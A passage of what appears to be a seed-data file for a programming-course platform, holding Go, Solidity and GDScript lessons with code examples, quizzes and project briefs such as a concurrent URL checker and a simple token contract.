          options: ['while', 'loop', 'for', 'repeat'],
          answer: 'for',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A Go switch case automatically falls through to the next case unless you add a break.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Iterating with "for i, v := range items" gives you both the index and the ____ on each pass.',
          options: [],
          answer: 'value',
        },
      ],
    },
  },
  {
    title: 'Functions and Multiple Return Values',
    content: lessonContent(
      'Functions and Multiple Return Values',
      `Go functions are straightforward, with one distinctive feature that shapes idiomatic Go code more than almost anything else: they can return **multiple values**.\n\n\`\`\`go\nfunc add(a int, b int) int {\n    return a + b\n}\n\nfunc divide(a, b float64) (float64, error) {\n    if b == 0 {\n        return 0, fmt.Errorf("cannot divide %v by zero", a)\n    }\n    return a / b, nil\n}\n\`\`\`\n\n\`\`\`go\nresult, err := divide(10, 0)\nif err != nil {\n    fmt.Println("Error:", err)\n} else {\n    fmt.Println("Result:", result)\n}\n\`\`\`\n\n## Why Go does errors this way\n\nGo deliberately has **no exceptions** for ordinary error handling. Instead, any function that can fail returns an \`error\` as its last value, \`nil\` means success. The caller checks \`if err != nil\` immediately after every call that could fail, this is more verbose than a \`try\`/\`catch\`, but it makes every possible failure point visible directly in the code, nothing can silently fail three function calls away.\n\n## Named returns\n\n\`\`\`go\nfunc minMax(nums []int) (min, max int) {\n    min, max = nums[0], nums[0]\n    for _, n := range nums {\n        if n < min { min = n }\n        if n > max { max = n }\n    }\n    return // "naked" return, sends back the current values of min and max\n}\n\`\`\`\n\nNaming return values documents intent directly in the function signature, and lets a bare \`return\` send back whatever they currently hold.`
    ),
    quiz: {
      title: 'Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How does idiomatic Go typically signal that a function call failed?',
          options: ['Throwing an exception', 'Returning a non-nil error as the last return value', 'Returning -1', 'Crashing the program immediately'],
          answer: 'Returning a non-nil error as the last return value',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A nil error return value conventionally means the function call succeeded.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A Go function can return more than one value at once, commonly a result and an ____.',
          options: [],
          answer: 'error',
        },
      ],
    },
  },
  {
    title: 'Structs and Methods',
    content: lessonContent(
      'Structs and Methods',
      `Go has no classes, but combines **structs** with **methods** (functions attached to a type) to get most of the same benefits, more explicitly.\n\n\`\`\`go\ntype Student struct {\n    Name string\n    XP   int\n}\n\nfunc (s *Student) GainXP(amount int) {\n    s.XP += amount\n}\n\nfunc (s Student) Greeting() string {\n    return "Hi, I'm " + s.Name\n}\n\`\`\`\n\n\`\`\`go\nada := Student{Name: "Ada", XP: 0}\nada.GainXP(50)\nfmt.Println(ada.XP)         // 50\nfmt.Println(ada.Greeting()) // "Hi, I'm Ada"\n\`\`\`\n\n\`func (s *Student) GainXP(...)\` is a **method** with \`s\` as its **receiver**, this is what attaches the function to the \`Student\` type, letting you call it as \`ada.GainXP(...)\` instead of \`GainXP(ada, ...)\`.\n\n## Pointer vs. value receivers\n\nThis is the one detail that trips everyone up at first: \`GainXP\` uses a **pointer** receiver (\`*Student\`) because it needs to *modify* the struct, \`Greeting\` uses a **value** receiver (\`Student\`) because it only *reads* from it. A value receiver operates on a copy, changes inside it never affect the original:\n\n\`\`\`go\nfunc (s Student) BrokenGainXP(amount int) {\n    s.XP += amount // only modifies the local copy, caller sees no change\n}\n\`\`\`\n\nRule of thumb: if a method needs to modify the struct, use a pointer receiver, if it only reads, either works, but staying consistent within a type is idiomatic Go.`
    ),
    quiz: {
      title: 'Structs and Methods Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does GainXP use a pointer receiver (*Student) instead of a value receiver?',
          options: ['Pointer receivers are always faster', 'It needs to modify the original struct, not a copy', 'Value receivers are illegal in Go', 'It is required for every method'],
          answer: 'It needs to modify the original struct, not a copy',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A method with a value receiver operates on a copy of the struct, so changes inside it are not visible to the caller.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In "func (s *Student) GainXP(...)", s is called the method\'s ____.',
          options: [],
          answer: 'receiver',
        },
      ],
    },
  },
  {
    title: 'Slices, Maps and Error Handling',
    content: lessonContent(
      'Slices, Maps and Error Handling',
      `Go's two everyday collection types, and a closer look at the error-handling pattern you've already seen in action.\n\n## Slices\n\nA slice is a resizable, dynamically-sized view over an underlying array, Go's equivalent of a list:\n\n\`\`\`go\nscores := []int{90, 85, 77}\nscores = append(scores, 100)    // append returns a new slice, always reassign it\nfmt.Println(scores[0])           // 90\nfmt.Println(len(scores))          // 4\n\nsubset := scores[1:3]              // elements at index 1 and 2\n\`\`\`\n\n\`append\` might allocate a new underlying array behind the scenes if the old one ran out of room, that's exactly why you always write \`scores = append(scores, ...)\` instead of just calling it and discarding the result.\n\n## Maps\n\n\`\`\`go\nscoresByName := map[string]int{"Ada": 95, "Grace": 98}\nscoresByName["Bob"] = 70\n\nvalue, ok := scoresByName["Missing"]\nfmt.Println(value, ok)     // 0 false, ok tells you whether the key existed\n\ndelete(scoresByName, "Bob")\n\`\`\`\n\nThe **comma-ok idiom** (\`value, ok := ...\`) is how Go distinguishes "the key exists and its value is the zero value" from "the key doesn't exist at all", both would otherwise look identical.\n\n## Error handling recap\n\n\`\`\`go\nfile, err := os.Open("data.txt")\nif err != nil {\n    fmt.Println("Could not open file:", err)\n    return\n}\ndefer file.Close()   // runs when the surrounding function returns, guaranteed\n\`\`\`\n\n\`defer\` schedules a call to run right before the enclosing function returns, no matter which \`return\` statement triggers it, exactly like a \`finally\` block, and the idiomatic way to guarantee cleanup (closing files, unlocking mutexes) happens.`
    ),
    quiz: {
      title: 'Slices, Maps and Error Handling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the second value in "value, ok := myMap[key]" tell you?',
          options: ['The type of the key', 'Whether the key exists in the map', 'The length of the map', 'Whether the map is nil'],
          answer: 'Whether the key exists in the map',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'defer schedules a function call to run right before the enclosing function returns.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The built-in function used to add an element to a slice is: ____(scores, newValue)',
          options: [],
          answer: 'append',
        },
      ],
    },
  },
  {
    title: 'Goroutines and Channels',
    content: lessonContent(
      'Goroutines and Channels',
      `Concurrency is Go's headline feature. A **goroutine** is a lightweight, independently-running function, and a **channel** is a typed pipe for goroutines to safely communicate through, instead of sharing memory directly.\n\n## Goroutines\n\n\`\`\`go\nfunc sayHi(name string) {\n    fmt.Println("Hi,", name)\n}\n\nfunc main() {\n    go sayHi("Ada")    // runs concurrently, doesn't block main\n    go sayHi("Grace")\n    time.Sleep(100 * time.Millisecond) // crude wait, channels below do this properly\n}\n\`\`\`\n\nThe \`go\` keyword launches a function as a goroutine, thousands of them can run concurrently with very little overhead, far lighter-weight than an OS thread.\n\n## Channels\n\nWithout coordination, \`main\` might exit before the goroutines above even run. Channels solve this properly:\n\n\`\`\`go\nfunc fetchStatus(url string, results chan<- string) {\n    // pretend this makes a real HTTP request\n    results <- url + ": OK"   // send a value into the channel\n}\n\nfunc main() {\n    urls := []string{"a.com", "b.com", "c.com"}\n    results := make(chan string)\n\n    for _, url := range urls {\n        go fetchStatus(url, results)\n    }\n\n    for range urls {\n        fmt.Println(<-results)   // receive a value, blocks until one arrives\n    }\n}\n\`\`\`\n\n\`results <- value\` sends into the channel, \`<-results\` receives from it, and receiving **blocks** until a value is available, this is exactly what replaces \`time.Sleep\` guesswork with real synchronization: \`main\` waits precisely as long as it needs to, no more, no less.\n\n> [!TIP]\n> Go's own proverb sums up the philosophy: "Don't communicate by sharing memory, share memory by communicating." Channels are the idiomatic way to coordinate goroutines, reaching for shared variables and locks is usually a sign to reach for a channel instead.`
    ),
    quiz: {
      title: 'Goroutines and Channels Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the "go" keyword do when placed before a function call?',
          options: ['Deletes the function', 'Runs the function as a lightweight, concurrent goroutine', 'Compiles the function ahead of time', 'Imports the function from another package'],
          answer: 'Runs the function as a lightweight, concurrent goroutine',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Receiving from a channel with <-results blocks until a value is available.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A typed pipe used for goroutines to safely send and receive values is called a ____.',
          options: [],
          answer: 'channel',
        },
      ],
    },
  },
  {
    title: 'Final Project: Concurrent URL Status Checker',
    content: lessonContent(
      'Final Project: Concurrent URL Status Checker',
      `Combine goroutines, channels, structs, and error handling into a small concurrent tool: a URL status checker that checks multiple URLs at once instead of one at a time.\n\n## Requirements\n\n1. Define a \`Result\` struct with fields for the URL, its HTTP status code (or an error), and how long the request took.\n2. Write a \`checkURL(url string, results chan<- Result)\` function using \`net/http\`'s \`http.Get\`, sending a \`Result\` into the channel when done (success or failure).\n3. In \`main\`, launch a goroutine per URL for a list of at least 5 URLs, then receive and print every result as it arrives.\n4. Handle the error case explicitly, a failed request should still produce a \`Result\` (with the error recorded), not crash the whole program.\n5. Print a final summary: how many succeeded, how many failed, and the total time the whole batch took (it should be close to the *slowest single request*, not the sum of all of them, that's the entire point of doing this concurrently).\n\n## Stretch goals\n\n- Add a timeout per request using \`context.WithTimeout\`.\n- Limit how many requests run at once (a worker pool) instead of launching unlimited goroutines.\n- Sort the final results by response time before printing.\n\nSubmit a link to your finished project below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const solidityLessons: SeedLesson[] = [
  {
    title: 'Introduction to Smart Contracts & Solidity',
    content: lessonContent(
      'Introduction to Smart Contracts & Solidity',
      `A **smart contract** is a program that lives on a blockchain, deployed once, then executed automatically and identically by every node in the network, no company or server can be shut down or quietly change its behavior. **Solidity** is the language most Ethereum smart contracts are written in.\n\n## Your first contract\n\n\`\`\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract Greeter {\n    string public greeting = "Hello, Kodstigen!";\n\n    function setGreeting(string memory newGreeting) public {\n        greeting = newGreeting;\n    }\n}\n\`\`\`\n\n- \`pragma solidity ^0.8.20;\` pins which compiler version this contract expects, the \`^\` allows any compatible 0.8.x version, protecting against breaking changes in future major versions.\n- \`contract Greeter { ... }\` is the closest thing Solidity has to a class, it bundles state and functions together, like a Java or C# class deployed permanently to the blockchain.\n- \`string public greeting\` is a **state variable**, permanently stored on the blockchain itself, \`public\` automatically generates a free getter function for it.\n\n## The EVM\n\nSolidity compiles to bytecode that runs on the **EVM** (Ethereum Virtual Machine), conceptually similar to how Java compiles to bytecode for the JVM, except every EVM node in the world executes the same bytecode and must reach the exact same result, that's what makes it trustworthy without a central authority.\n\n> [!WARNING]\n> Once deployed, a smart contract's code **cannot be changed**. There's no patching a bug in production the way you'd redeploy a web server, this is exactly why security and careful testing matter so much more here than in most other kinds of programming.`
    ),
    quiz: {
      title: 'Smart Contracts Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the EVM do?',
          options: ['Stores files for a website', 'Executes smart contract bytecode identically across every network node', 'Compiles Java to bytecode', 'Mines new Bitcoin'],
          answer: 'Executes smart contract bytecode identically across every network node',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A deployed smart contract\'s code can be edited later the same way you would redeploy a web server.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The pragma line at the top of a Solidity file pins which compiler ____ the contract expects.',
          options: [],
          answer: 'version',
        },
      ],
    },
  },
  {
    title: 'State Variables and Data Types',
    content: lessonContent(
      'State Variables and Data Types',
      `A **state variable** is permanently stored on the blockchain as part of the contract's data, every write to one costs real money (**gas**), which shapes how Solidity code is written more than almost anything else.\n\n\`\`\`solidity\ncontract Wallet {\n    uint256 public balance;          // unsigned integer, 256 bits\n    address public owner;             // an Ethereum address\n    bool public isLocked;\n    string public label = "Savings";\n\n    constructor() {\n        owner = msg.sender;   // the account that deployed the contract\n        balance = 0;\n    }\n}\n\`\`\`\n\n## Core types\n\n| Type | Meaning |\n|---|---|\n| \`uint256\` | Unsigned integer, 0 or positive, the most common numeric type |\n| \`int256\` | Signed integer, can be negative |\n| \`address\` | A 20-byte Ethereum account or contract address |\n| \`bool\` | true or false |\n| \`string\` / \`bytes\` | Text or raw byte data |\n\nSolidity has no floating-point type at all, financial logic is done in whole-number units (like storing cents instead of dollars) to avoid the rounding errors that plague floating-point money math in other languages.\n\n## msg.sender\n\n\`msg.sender\` is a special, always-available variable holding the address that called the current function, it's the foundation almost every access-control check in Solidity is built on, "is the caller allowed to do this?"\n\n\`\`\`solidity\nfunction withdraw() public {\n    require(msg.sender == owner, "Not the owner");\n    // ...\n}\n\`\`\``
    ),
    quiz: {
      title: 'State Variables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does Solidity have no floating-point type?',
          options: ['The EVM cannot store numbers', 'To avoid rounding errors in financial calculations, using whole-number units instead', 'Floating point was removed in a recent update', 'It is a bug that will be fixed'],
          answer: 'To avoid rounding errors in financial calculations, using whole-number units instead',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'msg.sender always holds the address that called the current function.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The Solidity type used to store an Ethereum account or contract address is: ____',
          options: [],
          answer: 'address',
        },
      ],
    },
  },
  {
    title: 'Functions and Visibility',
    content: lessonContent(
      'Functions and Visibility',
      `Every Solidity function needs an explicit **visibility**, controlling who can call it, and a **mutability** annotation, telling the EVM (and gas estimators) whether it touches the blockchain's state at all.\n\n\`\`\`solidity\ncontract Counter {\n    uint256 private count;\n\n    function increment() public {\n        count += 1;   // modifies state, costs gas\n    }\n\n    function getCount() public view returns (uint256) {\n        return count;  // only reads state, free to call\n    }\n\n    function double(uint256 n) public pure returns (uint256) {\n        return n * 2;   // touches no state at all, purely computes\n    }\n}\n\`\`\`\n\n## Visibility\n\n| Modifier | Callable from |\n|---|---|\n| \`public\` | Anyone, and from within the contract |\n| \`external\` | Only from outside the contract |\n| \`internal\` | This contract and contracts that inherit from it |\n| \`private\` | Only this exact contract |\n\n## Mutability\n\n- \`view\` functions read state but never modify it, calling one from outside costs **no gas**.\n- \`pure\` functions don't even read state, they're a pure computation on their inputs, also free to call.\n- Functions with neither modify state, and always cost gas when called as a real transaction.\n\n> [!TIP]\n> Marking a read-only function \`view\` isn't just documentation, the compiler enforces it, if you accidentally write to a state variable inside a function marked \`view\`, it simply won't compile.`
    ),
    quiz: {
      title: 'Functions and Visibility Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function type touches no state at all, purely computing from its inputs?',
          options: ['view', 'pure', 'external', 'payable'],
          answer: 'pure',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Calling a view function from outside the contract (not as part of a state-changing transaction) costs no gas.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The visibility modifier that only allows a function to be called from outside the contract is: ____',
          options: [],
          answer: 'external',
        },
      ],
    },
  },
  {
    title: 'Modifiers and Access Control',
    content: lessonContent(
      'Modifiers and Access Control',
      `A **modifier** wraps reusable logic, most commonly an access-control check, around a function, avoiding copy-pasting the same \`require\` statement into every function that needs it.\n\n\`\`\`solidity\ncontract Vault {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, "Not the owner");\n        _;   // this is where the wrapped function's body runs\n    }\n\n    function withdraw(uint256 amount) public onlyOwner {\n        // only the owner can ever reach this point\n    }\n\n    function setOwner(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n}\n\`\`\`\n\nThe \`_;\` inside a modifier marks exactly where the decorated function's own body gets spliced in, everything before \`_;\` runs first (here, the ownership check), and if \`require\` fails, the function body after it never executes at all, the whole transaction reverts.\n\n## require, revert, and assert\n\n\`\`\`solidity\nfunction transfer(address to, uint256 amount) public {\n    require(amount > 0, "Amount must be positive");   // validate input\n    require(balance[msg.sender] >= amount, "Insufficient balance");\n    balance[msg.sender] -= amount;\n    balance[to] += amount;\n}\n\`\`\`\n\n\`require\` checks a condition and reverts the **entire transaction** (undoing every state change made so far in it) with an error message if it fails, this all-or-nothing behavior is fundamental, a smart contract transaction can never be left half-finished.`
    ),
    quiz: {
      title: 'Modifiers and Access Control Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does _; represent inside a modifier?',
          options: ['A syntax error placeholder', 'Where the decorated function\'s body gets inserted', 'A private variable', 'The end of the contract'],
          answer: "Where the decorated function's body gets inserted",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'If a require() check fails partway through a function, all state changes made earlier in that same transaction are undone.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A reusable block of logic, commonly an access check, wrapped around a function is called a ____.',
          options: [],
          answer: 'modifier',
        },
      ],
    },
  },
  {
    title: 'Mappings, Structs and Arrays',
    content: lessonContent(
      'Mappings, Structs and Arrays',
      `Solidity's core data structures for organizing on-chain state, each with tradeoffs shaped by the fact that every operation costs gas.\n\n## Mappings\n\nA mapping is a key-value store, Solidity's version of a hash map, but with a twist: it has **no length**, and no way to iterate over its keys, every possible key conceptually already exists, mapped to its type's default (zero) value:\n\n\`\`\`solidity\nmapping(address => uint256) public balances;\n\nfunction deposit() public payable {\n    balances[msg.sender] += msg.value;\n}\n\`\`\`\n\nThere's no "key not found" error, \`balances[someRandomAddress]\` simply returns \`0\` if nothing was ever set, exactly the same as if it had explicitly been set to zero.\n\n## Structs\n\n\`\`\`solidity\nstruct Player {\n    string name;\n    uint256 xp;\n    bool active;\n}\n\nmapping(address => Player) public players;\n\nfunction register(string memory name) public {\n    players[msg.sender] = Player(name, 0, true);\n}\n\`\`\`\n\nMappings and structs combine constantly, exactly like the pattern above, associating a wallet address with a whole record of data about it.\n\n## Arrays\n\n\`\`\`solidity\naddress[] public registeredPlayers;\n\nfunction register2() public {\n    registeredPlayers.push(msg.sender);\n}\n\`\`\`\n\nUnlike mappings, arrays **do** have a length and can be iterated, but looping over a large on-chain array in a function costs gas proportional to its size, and can even become too expensive to call at all if it grows large enough. This is exactly why mappings, not arrays, are the default choice for most on-chain lookups.`
    ),
    quiz: {
      title: 'Mappings, Structs and Arrays Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens when you read a mapping key that was never explicitly set?',
          options: ['It throws an error', 'It returns the type\'s default (zero) value', 'It returns null', 'The transaction reverts'],
          answer: "It returns the type's default (zero) value",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Looping over a large on-chain array can become expensive or even too costly to call as gas usage grows with its size.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Solidity\'s key-value data structure, which has no length and cannot be iterated, is called a ____.',
          options: [],
          answer: 'mapping',
        },
      ],
    },
  },
  {
    title: 'Events and Error Handling',
    content: lessonContent(
      'Events and Error Handling',
      `Smart contracts run in an isolated environment with no built-in "print to console" for the outside world, **events** are how a contract communicates what happened to applications and users watching the blockchain.\n\n\`\`\`solidity\ncontract Token {\n    mapping(address => uint256) public balances;\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    function transfer(address to, uint256 amount) public {\n        require(amount > 0, "Amount must be positive");\n        require(balances[msg.sender] >= amount, "Insufficient balance");\n\n        balances[msg.sender] -= amount;\n        balances[to] += amount;\n\n        emit Transfer(msg.sender, to, amount);\n    }\n}\n\`\`\`\n\n\`emit Transfer(...)\` writes a permanent, cheap-to-store log entry to the blockchain, off-chain applications (like a wallet's UI, or a block explorer) listen for these events instead of constantly polling contract state, it's how "your transaction went through" notifications actually work under the hood. \`indexed\` parameters can be efficiently searched/filtered by event listeners.\n\n## Custom errors\n\nModern Solidity favors custom errors over plain string messages, they're significantly cheaper in gas:\n\n\`\`\`solidity\nerror InsufficientBalance(uint256 available, uint256 requested);\n\nfunction withdraw(uint256 amount) public {\n    if (balances[msg.sender] < amount) {\n        revert InsufficientBalance(balances[msg.sender], amount);\n    }\n    balances[msg.sender] -= amount;\n}\n\`\`\`\n\n\`revert\` with a custom error immediately stops execution and undoes all state changes in the current transaction, exactly like \`require\`, but lets you attach structured data (here, the actual vs. requested amounts) instead of just a plain string.`
    ),
    quiz: {
      title: 'Events and Error Handling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main purpose of an event in Solidity?',
          options: ['To store data more cheaply than a state variable', 'To let off-chain applications know something happened on-chain', 'To validate function inputs', 'To restrict who can call a function'],
          answer: 'To let off-chain applications know something happened on-chain',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Custom errors are generally cheaper in gas than plain require() string messages.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to write an event to the blockchain\'s log is: ____ Transfer(...)',
          options: [],
          answer: 'emit',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Simple Token Contract',
    content: lessonContent(
      'Final Project: Build a Simple Token Contract',
      `Combine everything from this course into a simple, ERC-20-style fungible token contract, the same basic pattern underlying most tokens on Ethereum.\n\n## Requirements\n\n1. Declare state variables for \`name\`, \`symbol\`, \`totalSupply\`, and a \`mapping(address => uint256)\` for balances.\n2. In the constructor, mint the entire \`totalSupply\` to \`msg.sender\` (the deployer).\n3. Implement \`function transfer(address to, uint256 amount) public returns (bool)\`, using \`require\` to check the sender has enough balance, updating both balances, and emitting a \`Transfer\` event.\n4. Implement \`function balanceOf(address account) public view returns (uint256)\`.\n5. Add an \`onlyOwner\`-style modifier and a \`mint(address to, uint256 amount)\` function restricted to the contract's owner, that increases \`totalSupply\` and the recipient's balance.\n6. Use a custom error (not a plain string) for the insufficient-balance case in \`transfer\`.\n\n## Stretch goals\n\n- Add \`approve\`/\`transferFrom\` to support spending on someone else's behalf (the rest of the real ERC-20 standard).\n- Add a \`burn(uint256 amount)\` function that destroys tokens from the caller's own balance.\n- Write a few test cases (using Hardhat or Foundry) proving transfer fails correctly when the sender has insufficient balance.\n\nSubmit a link to your finished contract below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const gdscriptLessons: SeedLesson[] = [
  {
    title: 'Introduction to GDScript & Godot',
    content: lessonContent(
      'Introduction to GDScript & Godot',
      `**Godot** is a free, open-source game engine, and **GDScript** is its built-in scripting language, designed specifically to feel natural for game development and to integrate tightly with the engine's editor.\n\n## Nodes and the scene tree\n\nEverything in a Godot game is a **node**: a sprite, a button, a sound player, even an abstract logic container. Nodes are arranged into a tree, and a saved tree of nodes is called a **scene**:\n\n\`\`\`\nPlayer (CharacterBody2D)\n├── Sprite2D\n├── CollisionShape2D\n└── Camera2D\n\`\`\`\n\nA scene can be instanced inside another scene, exactly like a reusable component, this is how a "Player" scene gets placed into a "Level" scene without duplicating its logic.\n\n## Your first script\n\n\`\`\`gdscript\nextends Node2D\n\nfunc _ready():\n    print("Hello, Kodstigen!")\n\nfunc _process(delta):\n    # runs every single frame, delta is the time since the last frame in seconds\n    pass\n\`\`\`\n\n- \`extends Node2D\` attaches this script's behavior to a node of type \`Node2D\` (or anything that inherits from it), scripts in Godot are never standalone, they always extend some node type.\n- \`_ready()\` is a **lifecycle method** the engine calls automatically once, when the node first enters the running scene.\n- \`_process(delta)\` is called automatically every rendered frame, \`delta\` lets you write movement and animation that's consistent regardless of frame rate.\n\n> [!TIP]\n> Function names starting with an underscore, like \`_ready\` and \`_process\`, are **engine callbacks**, Godot calls them for you at the right moment, you never call them yourself directly.`
    ),
    quiz: {
      title: 'Introduction to GDScript Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a "scene" in Godot?',
          options: ['A single image asset', 'A saved tree of nodes that can be instanced elsewhere', 'A sound effect', 'A compiled executable'],
          answer: 'A saved tree of nodes that can be instanced elsewhere',
        },
        {
          type: 'TRUE_FALSE',
          prompt: '_process(delta) is called automatically by the engine every frame.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The lifecycle method Godot calls automatically once, when a node first enters the running scene, is: _____()',
          options: [],
          answer: '_ready',
        },
      ],
    },
  },
  {
    title: 'Variables and Types',
    content: lessonContent(
      'Variables and Types',
      `GDScript is dynamically typed by default, like Python, but with **optional static typing** you can add for extra safety and editor autocompletion.\n\n\`\`\`gdscript\nvar xp = 0              # dynamically typed, inferred as int\nvar name := "Ada"        # := infers AND locks in the type (String)\nvar health: float = 100.0 # explicit static type annotation\n\nxp += 10\n\`\`\`\n\n\`var xp = 0\` works exactly like Python, no type is enforced. \`var name := "Ada"\` (with a colon before \`=\`) tells the compiler to infer the type once and then **enforce** it, assigning a number to \`name\` later becomes a compile-time error instead of a silent bug.\n\n## Exported variables\n\nA variable marked \`@export\` becomes editable directly in the Godot editor's Inspector panel, no code changes needed to tweak it:\n\n\`\`\`gdscript\nextends CharacterBody2D\n\n@export var speed: float = 300.0\n@export var jump_velocity: float = -400.0\n\`\`\`\n\nThis is one of GDScript's most distinctive features, a game designer with no programming background can tune \`speed\` and \`jump_velocity\` by dragging a slider in the editor, without ever opening this file.\n\n## Common built-in types\n\n\`\`\`gdscript\nvar position := Vector2(100, 50)   # a 2D point/vector, everywhere in 2D games\nvar items := ["sword", "shield"]     # array\nvar stats := {"str": 10, "dex": 8}    # dictionary\n\`\`\`\n\n\`Vector2\` isn't just a convenience class, it has built-in math operators (\`+\`, \`-\`, \`*\`) that work exactly as you'd expect mathematically, since 2D position and movement math is something almost every game script needs constantly.`
    ),
    quiz: {
      title: 'Variables and Types Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does marking a variable with @export do?',
          options: ['Makes it read-only', 'Makes it editable in the Godot editor\'s Inspector panel', 'Deletes it when the game exits', 'Converts it to a global variable'],
          answer: "Makes it editable in the Godot editor's Inspector panel",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'GDScript requires every variable to have an explicit static type declared.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The built-in type commonly used to represent a 2D point or movement vector is: ____',
          options: [],
          answer: 'Vector2',
        },
      ],
    },
  },
  {
    title: 'Control Flow and Functions',
    content: lessonContent(
      'Control Flow and Functions',
      `GDScript's syntax leans heavily on Python: indentation defines blocks, no curly braces, no semicolons.\n\n\`\`\`gdscript\nvar xp = 45\n\nif xp >= 100:\n    print("Level up!")\nelif xp >= 50:\n    print("Almost there")\nelse:\n    print("Keep going")\n\`\`\`\n\n## Loops\n\n\`\`\`gdscript\nfor i in range(5):\n    print(i)\n\nvar items = ["sword", "shield", "potion"]\nfor item in items:\n    print(item)\n\nvar tries = 0\nwhile tries < 3:\n    tries += 1\n\`\`\`\n\n\`for item in items\` iterates directly over any array-like value, exactly like Python's \`for x in list\`.\n\n## Functions\n\n\`\`\`gdscript\nfunc calculate_damage(base: int, multiplier: float = 1.0) -> int:\n    return int(base * multiplier)\n\nvar dmg = calculate_damage(10)        # 10, uses the default multiplier\nvar crit = calculate_damage(10, 2.0)   # 20\n\`\`\`\n\n\`multiplier: float = 1.0\` gives the parameter a **default value**, callers can omit it entirely. \`-> int\` is an optional return-type annotation, purely for clarity and editor tooling, not enforced as strictly as some statically-typed languages.\n\n> [!TIP]\n> Because indentation is meaningful, mixing tabs and spaces in the same GDScript file causes real parse errors, not just style warnings. Configure your editor to use one or the other consistently.`
    ),
    quiz: {
      title: 'Control Flow and Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What defines a code block in GDScript?',
          options: ['Curly braces {}', 'The keyword "block"', 'Indentation, like Python', 'Semicolons'],
          answer: 'Indentation, like Python',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A function parameter can be given a default value, making it optional for callers.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to define a function in GDScript is: ____ calculate_damage(base):',
          options: [],
          answer: 'func',
        },
      ],
    },
  },
  {
    title: 'Signals',
    content: lessonContent(
      'Signals',
